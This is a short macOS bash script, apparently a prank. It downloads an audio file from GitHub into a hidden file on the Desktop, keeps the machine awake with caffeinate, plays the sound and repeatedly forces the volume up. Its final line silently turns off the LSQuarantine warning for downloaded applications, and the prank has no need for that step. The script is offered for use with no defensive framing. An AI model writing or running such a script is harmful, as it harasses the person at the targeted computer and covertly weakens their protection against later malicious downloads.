#! /bin/bash
curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/P.mp3 --output ~/Desktop/.troll.mp3

caffeinate &
afplay ~/Desktop/.troll.mp3 &

end=$((SECONDS+5))

while [ $SECONDS -lt $end ]; do
	osascript -e 'set volume 3'
done

#Disable the “Are you sure you want to open this application?” dialog
defaults write com.apple.LaunchServices LSQuarantine -bool false
